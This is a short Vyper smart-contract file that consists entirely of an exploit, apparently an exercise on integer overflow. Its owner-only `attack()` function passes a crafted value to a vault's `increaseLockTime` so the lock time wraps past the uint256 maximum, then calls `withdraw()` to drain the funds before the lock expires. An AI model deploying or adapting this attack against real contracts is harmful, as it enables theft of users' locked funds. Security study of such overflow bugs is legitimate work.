# @version ^0.3.7

interface IVault:
    def lockTime(addr: address) -> uint256: view
    def increaseLockTime(
        _secondsToIncrease: uint256
    ): nonpayable
    def withdraw(): nonpayable

owner: immutable(address)

vault: IVault

@external
@payable
def __init__(_vault: address):
    owner = msg.sender
    self.vault = IVault(_vault)

@external
def attack():
    assert msg.sender == owner, "!owner"
    overflow: uint256 = max_value(uint256) - self.vault.lockTime(owner) + 1
    self.vault.increaseLockTime(overflow)
    self.vault.withdraw()

@external
@payable
def __default__():
    pass
